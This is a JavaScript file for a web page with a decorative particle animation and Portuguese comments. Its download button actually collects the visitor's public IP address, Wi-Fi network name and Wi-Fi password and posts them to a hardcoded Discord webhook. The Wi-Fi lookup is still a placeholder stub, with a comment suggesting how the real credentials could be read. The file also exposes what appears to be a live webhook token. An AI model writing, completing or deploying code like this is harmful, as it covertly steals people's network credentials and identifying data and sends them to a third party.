document.addEventListener('DOMContentLoaded', () => {
    const particleBackground = document.querySelector('.particle-background');
    const numParticles = 100;
    const infoDiv = document.getElementById('info');

    for (let i = 0; i < numParticles; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        particle.style.width = `${Math.random() * 3 + 1}px`;
        particle.style.height = particle.style.width;
        particle.style.left = `${Math.random() * 100}vw`;
        particle.style.top = `${Math.random() * 100}vh`;
        particle.style.animationDuration = `${Math.random() * 5 + 5}s`;
        particle.style.animationDelay = `${Math.random() * 5}s`;
        particleBackground.appendChild(particle);
    }

    document.getElementById('downloadButton').addEventListener('click', async () => {
        try {
            const ip = await getIPAddress();
            const networkInfo = await getNetworkInfo();
            const webhookText = `IP: ${ip}\nNome da Rede: ${networkInfo.ssid}\nSenha: ${networkInfo.password}`;

            infoDiv.innerText = webhookText;
            sendWebhook(webhookText);
        } catch (error) {
            infoDiv.innerText = `Erro: ${error.message}`;
        }
    });
});

async function getIPAddress() {
    // Esta função deve ser implementada para obter o IP da rede. Pode usar uma API externa ou um script Node.js.
    // Exemplo usando uma API externa:
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

async function getNetworkInfo() {
    // Esta função deve ser implementada para obter o nome e a senha da rede Wi-Fi.
    // Pode usar um script Node.js para obter essas informações do sistema operacional.
    // Exemplo:
    return {
        ssid: 'NomeDaRede',
        password: 'SenhaDaRede'
    };
}

function sendWebhook(text) {
    // Esta função deve ser implementada para enviar o texto para um webhook.
    // Exemplo usando fetch:
    fetch('https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: text })
    });
}
